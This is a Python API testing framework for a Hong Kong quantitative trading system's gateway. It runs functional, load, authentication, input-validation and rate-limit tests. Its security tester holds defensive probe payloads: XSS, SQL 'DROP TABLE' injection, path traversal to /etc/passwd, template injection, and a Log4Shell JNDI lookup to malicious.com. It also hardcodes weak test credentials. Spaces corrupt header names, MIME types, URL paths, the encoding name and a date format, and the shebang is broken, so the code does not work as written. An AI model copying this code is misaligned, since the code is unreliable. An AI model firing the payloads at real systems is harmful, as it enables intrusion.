#!/usr / bin / env python3
"""
API測試框架
港股量化交易系統 - 自動化API測試

提供完整的API測試功能，包括單元測試、集成測試、
性能測試、安全測試等。

測試類型:
- 功能測試
- 性能測試
- 安全測試
- 負載測試
- 兼容性測試
"""

import asyncio
import hashlib
import json
import logging
import statistics
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import asdict, dataclass
from datetime import datetime, timedelta
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Tuple

import httpx
import jwt
import pytest

logger = logging.getLogger(__name__)


@dataclass
class TestCase:
    """測試用例"""

    name: str
    method: str
    path: str
    headers: Dict[str, str] = None
    params: Dict[str, Any] = None
    body: Dict[str, Any] = None
    expected_status: int = 200
    expected_response: Dict[str, Any] = None
    timeout: float = 30.0
    tags: List[str] = None


@dataclass
class TestResult:
    """測試結果"""

    test_name: str
    success: bool
    status_code: int
    response_time: float
    response_data: Any = None
    error_message: str = ""
    assertion_errors: List[str] = None
    timestamp: datetime = None

    def __post_init__(self):
        if self.assertion_errors is None:
            self.assertion_errors = []
        if self.timestamp is None:
            self.timestamp = datetime.utcnow()


@dataclass
class PerformanceMetrics:
    """性能指標"""

    total_requests: int
    successful_requests: int
    failed_requests: int
    avg_response_time: float
    min_response_time: float
    max_response_time: float
    p50_response_time: float
    p95_response_time: float
    p99_response_time: float
    requests_per_second: float
    error_rate: float
    total_time: float


class APITestClient:
    """API測試客戶端"""

    def __init__(
        self, base_url: str, timeout: float = 30.0, max_connections: int = 100
    ):
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        self.max_connections = max_connections
        self.client: Optional[httpx.AsyncClient] = None
        self.jwt_token: Optional[str] = None
        self.api_key: Optional[str] = None

    async def __aenter__(self):
        limits = httpx.Limits(max_keepalive_connections=self.max_connections)
        self.client = httpx.AsyncClient(
            base_url=self.base_url, timeout=self.timeout, limits=limits
        )
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.client:
            await self.client.aclose()

    def set_jwt_token(self, token: str):
        """設置JWT認證令牌"""
        self.jwt_token = token

    def set_api_key(self, api_key: str):
        """設置API密鑰"""
        self.api_key = api_key

    def _get_headers(self, headers: Dict[str, str] = None) -> Dict[str, str]:
        """獲取請求頭"""
        request_headers = {
            "Content - Type": "application / json",
            "Accept": "application / json",
        }

        if headers:
            request_headers.update(headers)

        # 添加認證頭
        if self.jwt_token:
            request_headers["Authorization"] = f"Bearer {self.jwt_token}"
        elif self.api_key:
            request_headers["X - API - Key"] = self.api_key

        return request_headers

    async def request(
        self,
        method: str,
        path: str,
        headers: Dict[str, str] = None,
        params: Dict[str, Any] = None,
        body: Dict[str, Any] = None,
    ) -> Tuple[int, float, Any]:
        """發送HTTP請求"""
        request_headers = self._get_headers(headers)

        start_time = time.time()

        try:
            response = await self.client.request(
                method=method.upper(),
                url=path,
                headers=request_headers,
                params=params,
                json=body,
            )

            response_time = time.time() - start_time

            # 解析響應
            try:
                response_data = response.json()
            except (json.JSONDecodeError, ValueError):
                response_data = response.text

            return response.status_code, response_time, response_data

        except Exception as e:
            response_time = time.time() - start_time
            logger.error(f"請求失敗: {method} {path} - {str(e)}")
            raise

    async def login(self, username: str, password: str) -> bool:
        """用戶登錄"""
        try:
            status_code, _, response_data = await self.request(
                "POST", "/auth / login", body={"username": username, "password": password}
            )

            if status_code == 200 and response_data.get("success"):
                token = response_data["data"].get("token")
                if token:
                    self.set_jwt_token(token)
                    return True

            return False

        except Exception as e:
            logger.error(f"登錄失敗: {e}")
            return False


class APITestRunner:
    """API測試運行器"""

    def __init__(self, client: APITestClient):
        self.client = client
        self.results: List[TestResult] = []

    async def run_test_case(self, test_case: TestCase) -> TestResult:
        """運行單個測試用例"""
        logger.info(f"運行測試: {test_case.name}")

        try:
            start_time = time.time()

            # 發送請求
            status_code, response_time, response_data = await self.client.request(
                method=test_case.method,
                path=test_case.path,
                headers=test_case.headers,
                params=test_case.params,
                body=test_case.body,
            )

            # 執行斷言
            assertion_errors = []

            # 檢查狀態碼
            if status_code != test_case.expected_status:
                assertion_errors.append(
                    f"狀態碼不匹配: 期望 {test_case.expected_status}, 實際 {status_code}"
                )

            # 檢查響應內容
            if test_case.expected_response:
                if not self._assert_response_structure(
                    response_data, test_case.expected_response
                ):
                    assertion_errors.append("響應結構不匹配")

            success = len(assertion_errors) == 0

            result = TestResult(
                test_name=test_case.name,
                success=success,
                status_code=status_code,
                response_time=response_time,
                response_data=response_data,
                assertion_errors=assertion_errors,
            )

            self.results.append(result)
            return result

        except Exception as e:
            error_message = str(e)
            logger.error(f"測試失敗: {test_case.name} - {error_message}")

            result = TestResult(
                test_name=test_case.name,
                success=False,
                status_code=0,
                response_time=0,
                error_message=error_message,
            )

            self.results.append(result)
            return result

    def _assert_response_structure(self, actual: Any, expected: Dict[str, Any]) -> bool:
        """檢查響應結構"""
        if not isinstance(actual, dict) or not isinstance(expected, dict):
            return False

        for key, value in expected.items():
            if key not in actual:
                return False

            if isinstance(value, dict):
                if not self._assert_response_structure(actual[key], value):
                    return False
            elif isinstance(value, list):
                if not isinstance(actual[key], list):
                    return False
            elif actual[key] != value:
                return False

        return True

    async def run_test_suite(self, test_cases: List[TestCase]) -> List[TestResult]:
        """運行測試套件"""
        logger.info(f"運行測試套件，共 {len(test_cases)} 個測試用例")

        results = []
        for test_case in test_cases:
            result = await self.run_test_case(test_case)
            results.append(result)

            # 測試間隔，避免過於頻繁的請求
            await asyncio.sleep(0.1)

        return results

    def get_test_summary(self) -> Dict[str, Any]:
        """獲取測試摘要"""
        if not self.results:
            return {}

        total_tests = len(self.results)
        passed_tests = sum(1 for r in self.results if r.success)
        failed_tests = total_tests - passed_tests
        pass_rate = (passed_tests / total_tests) * 100 if total_tests > 0 else 0

        response_times = [r.response_time for r in self.results if r.response_time > 0]
        avg_response_time = statistics.mean(response_times) if response_times else 0

        return {
            "total_tests": total_tests,
            "passed_tests": passed_tests,
            "failed_tests": failed_tests,
            "pass_rate": pass_rate,
            "avg_response_time": avg_response_time,
            "execution_time": datetime.utcnow().isoformat(),
        }


class PerformanceTester:
    """性能測試器"""

    def __init__(self, client: APITestClient):
        self.client = client

    async def run_load_test(
        self,
        test_case: TestCase,
        concurrency: int = 10,
        total_requests: int = 100,
        duration: Optional[float] = None,
    ) -> PerformanceMetrics:
        """運行負載測試"""
        logger.info(
            f"開始負載測試: {test_case.name}, 並發數: {concurrency}, 總請求數: {total_requests}"
        )

        response_times = []
        errors = []
        start_time = time.time()

        async def worker():
            """工作線程"""
            nonlocal response_times, errors

            while len(response_times) + len(errors) < total_requests:
                if duration and (time.time() - start_time) > duration:
                    break

                try:
                    status_code, response_time, _ = await self.client.request(
                        method=test_case.method,
                        path=test_case.path,
                        headers=test_case.headers,
                        params=test_case.params,
                        body=test_case.body,
                    )

                    response_times.append(response_time)

                    if status_code >= 400:
                        errors.append(status_code)

                except Exception as e:
                    errors.append(str(e))

                # 小延遲避免過於頻繁的請求
                await asyncio.sleep(0.01)

        # 啟動並發工作線程
        tasks = [asyncio.create_task(worker()) for _ in range(concurrency)]
        await asyncio.gather(*tasks, return_exceptions=True)

        total_time = time.time() - start_time

        # 計算性能指標
        successful_requests = len(response_times)
        failed_requests = len(errors)
        total_requests_made = successful_requests + failed_requests

        if response_times:
            avg_response_time = statistics.mean(response_times)
            min_response_time = min(response_times)
            max_response_time = max(response_times)
            p50_response_time = statistics.median(response_times)
            p95_response_time = self._percentile(response_times, 95)
            p99_response_time = self._percentile(response_times, 99)
        else:
            avg_response_time = min_response_time = max_response_time = 0
            p50_response_time = p95_response_time = p99_response_time = 0

        requests_per_second = total_requests_made / total_time if total_time > 0 else 0
        error_rate = (
            (failed_requests / total_requests_made) * 100
            if total_requests_made > 0
            else 0
        )

        metrics = PerformanceMetrics(
            total_requests=total_requests_made,
            successful_requests=successful_requests,
            failed_requests=failed_requests,
            avg_response_time=avg_response_time,
            min_response_time=min_response_time,
            max_response_time=max_response_time,
            p50_response_time=p50_response_time,
            p95_response_time=p95_response_time,
            p99_response_time=p99_response_time,
            requests_per_second=requests_per_second,
            error_rate=error_rate,
            total_time=total_time,
        )

        logger.info(
            f"負載測試完成: RPS={requests_per_second:.2f}, 錯誤率={error_rate:.2f}%"
        )

        return metrics

    def _percentile(self, data: List[float], percentile: float) -> float:
        """計算百分位數"""
        if not data:
            return 0

        sorted_data = sorted(data)
        index = (percentile / 100) * (len(sorted_data) - 1)
        lower_index = int(index)
        upper_index = lower_index + 1

        if upper_index >= len(sorted_data):
            return sorted_data[-1]

        weight = index - lower_index
        return (
            sorted_data[lower_index] * (1 - weight) + sorted_data[upper_index] * weight
        )


class SecurityTester:
    """安全測試器"""

    def __init__(self, client: APITestClient):
        self.client = client
        self.vulnerability_tests = []

    async def test_authentication(self, endpoints: List[str]) -> List[TestResult]:
        """測試認證機制"""
        results = []

        for endpoint in endpoints:
            # 測試無認證訪問
            test_case = TestCase(
                name=f"無認證訪問 {endpoint}",
                method="GET",
                path=endpoint,
                expected_status=401,
            )

            result = await self._run_test(test_case)
            results.append(result)

            # 測試無效token
            self.client.set_jwt_token("invalid_token")
            test_case = TestCase(
                name=f"無效token訪問 {endpoint}",
                method="GET",
                path=endpoint,
                expected_status=401,
            )

            result = await self._run_test(test_case)
            results.append(result)

            # 清除token
            self.client.set_jwt_token(None)

        return results

    async def test_authorization(
        self, endpoints: Dict[str, List[str]]
    ) -> List[TestResult]:
        """測試授權機制"""
        results = []

        # 使用普通用戶權限
        await self.client.login("user", "password123")

        for role, protected_endpoints in endpoints.items():
            for endpoint in protected_endpoints:
                test_case = TestCase(
                    name=f"權限測試 {role} {endpoint}",
                    method="GET",
                    path=endpoint,
                    expected_status=403,  # 預期拒絕訪問
                )

                result = await self._run_test(test_case)
                results.append(result)

        return results

    async def test_input_validation(self, endpoints: List[str]) -> List[TestResult]:
        """測試輸入驗證"""
        results = []

        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc / passwd",
            "{{7 * 7}}",
            "${jndi:ldap://malicious.com / a}",
        ]

        for endpoint in endpoints:
            for malicious_input in malicious_inputs:
                test_case = TestCase(
                    name=f"輸入驗證 {endpoint} - {malicious_input[:20]}",
                    method="GET",
                    path=endpoint,
                    params={"input": malicious_input},
                    expected_status=400,  # 預期拒絕惡意輸入
                )

                result = await self._run_test(test_case)
                results.append(result)

        return results

    async def test_rate_limiting(self, endpoint: str) -> TestResult:
        """測試限流機制"""
        # 快速發送大量請求
        rapid_requests = []
        for i in range(100):
            test_case = TestCase(
                name=f"限流測試請求 {i}",
                method="GET",
                path=endpoint,
                expected_status=200,
            )
            rapid_requests.append(test_case)

        # 並發執行
        start_time = time.time()
        results = await asyncio.gather(
            *[self._run_test(test_case) for test_case in rapid_requests[:50]]
        )
        end_time = time.time()

        # 檢查是否有429狀態碼
        rate_limited = any(r.status_code == 429 for r in results)

        return TestResult(
            test_name="限流測試",
            success=rate_limited,
            status_code=429 if rate_limited else 200,
            response_time=end_time - start_time,
            response_data={"rate_limited": rate_limited},
        )

    async def _run_test(self, test_case: TestCase) -> TestResult:
        """運行單個測試"""
        try:
            status_code, response_time, response_data = await self.client.request(
                method=test_case.method,
                path=test_case.path,
                headers=test_case.headers,
                params=test_case.params,
                body=test_case.body,
            )

            success = status_code == test_case.expected_status

            return TestResult(
                test_name=test_case.name,
                success=success,
                status_code=status_code,
                response_time=response_time,
                response_data=response_data,
            )

        except Exception as e:
            return TestResult(
                test_name=test_case.name,
                success=False,
                status_code=0,
                response_time=0,
                error_message=str(e),
            )


class APITestSuite:
    """API測試套件"""

    def __init__(self, base_url: str):
        self.base_url = base_url

    def create_functional_tests(self) -> List[TestCase]:
        """創建功能測試用例"""
        return [
            # 健康檢查
            TestCase(
                name="健康檢查", method="GET", path="/health", expected_status=200
            ),
            # 認證測試
            TestCase(
                name="用戶登錄",
                method="POST",
                path="/auth / login",
                body={"username": "admin", "password": "admin123"},
                expected_status=200,
            ),
            # 股票數據測試
            TestCase(
                name="獲取股票數據",
                method="GET",
                path="/api / v1 / analysis / stocks / 0700.HK",
                expected_status=200,
            ),
            # 技術指標測試
            TestCase(
                name="獲取技術指標",
                method="GET",
                path="/api / v1 / analysis / stocks / 0700.HK / indicators",
                params={"indicators": "sma,rsi,macd"},
                expected_status=200,
            ),
            # 投資組合測試
            TestCase(
                name="獲取投資組合",
                method="GET",
                path="/api / v1 / portfolio / portfolios",
                expected_status=200,
            ),
            # 風險指標測試
            TestCase(
                name="獲取風險指標",
                method="GET",
                path="/api / v1 / risk / risk / metrics",
                expected_status=200,
            ),
            # 錯誤處理測試
            TestCase(
                name="無效股票代碼",
                method="GET",
                path="/api / v1 / analysis / stocks / INVALID",
                expected_status=400,
            ),
        ]

    def create_performance_tests(self) -> List[TestCase]:
        """創建性能測試用例"""
        return [
            TestCase(
                name="股票數據性能測試",
                method="GET",
                path="/api / v1 / analysis / stocks / 0700.HK",
                expected_status=200,
            ),
            TestCase(
                name="技術指標性能測試",
                method="GET",
                path="/api / v1 / analysis / stocks / 0700.HK / indicators",
                expected_status=200,
            ),
        ]

    async def run_full_test_suite(
        self, username: str = "admin", password: str = "admin123"
    ) -> Dict[str, Any]:
        """運行完整測試套件"""
        logger.info("開始運行完整API測試套件")

        async with APITestClient(self.base_url) as client:
            # 登錄獲取認證
            await client.login(username, password)

            test_runner = APITestRunner(client)
            performance_tester = PerformanceTester(client)
            security_tester = SecurityTester(client)

            results = {
                "timestamp": datetime.utcnow().isoformat(),
                "base_url": self.base_url,
                "functional_tests": {},
                "performance_tests": {},
                "security_tests": {},
            }

            # 1. 功能測試
            logger.info("運行功能測試...")
            functional_tests = self.create_functional_tests()
            functional_results = await test_runner.run_test_suite(functional_tests)
            results["functional_tests"] = {
                "summary": test_runner.get_test_summary(),
                "results": [asdict(r) for r in functional_results],
            }

            # 2. 性能測試
            logger.info("運行性能測試...")
            performance_tests = self.create_performance_tests()
            performance_results = {}

            for test_case in performance_tests:
                metrics = await performance_tester.run_load_test(
                    test_case, concurrency=5, total_requests=50
                )
                performance_results[test_case.name] = asdict(metrics)

            results["performance_tests"] = {"results": performance_results}

            # 3. 安全測試
            logger.info("運行安全測試...")
            security_results = {}

            # 認證測試
            auth_results = await security_tester.test_authentication(
                ["/api / v1 / analysis / stocks / 0700.HK", "/api / v1 / portfolio / portfolios"]
            )
            security_results["authentication"] = [asdict(r) for r in auth_results]

            # 輸入驗證測試
            input_validation_results = await security_tester.test_input_validation(
                ["/api / v1 / analysis / stocks / 0700.HK"]
            )
            security_results["input_validation"] = [
                asdict(r) for r in input_validation_results
            ]

            # 限流測試
            rate_limit_result = await security_tester.test_rate_limiting("/health")
            security_results["rate_limiting"] = asdict(rate_limit_result)

            results["security_tests"] = security_results

            # 生成測試報告
            self._generate_test_report(results)

        logger.info("完整API測試套件執行完成")
        return results

    def _generate_test_report(self, results: Dict[str, Any]):
        """生成測試報告"""
        report_dir = Path("test_reports")
        report_dir.mkdir(exist_ok=True)

        timestamp = datetime.now().strftime("%Y % m % d_ % H % M % S")
        report_file = report_dir / f"api_test_report_{timestamp}.json"

        with open(report_file, "w", encoding="utf - 8") as f:
            json.dump(results, f, indent=2, ensure_ascii=False, default=str)

        logger.info(f"測試報告已生成: {report_file}")


async def main():
    """主函數"""
    # 配置日誌
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    )

    # API網關地址
    base_url = "http://localhost:7777"

    # 創建測試套件
    test_suite = APITestSuite(base_url)

    # 運行完整測試
    test_results = await test_suite.run_full_test_suite()

    # 打印測試摘要
    functional_summary = test_results["functional_tests"]["summary"]
    logger.info(
        """
測試完成摘要:
- 總測試數: {functional_summary['total_tests']}
- 通過測試: {functional_summary['passed_tests']}
- 失敗測試: {functional_summary['failed_tests']}
- 通過率: {functional_summary['pass_rate']:.2f}%
- 平均響應時間: {functional_summary['avg_response_time']:.3f}s
"""
    )


if __name__ == "__main__":
    asyncio.run(main())
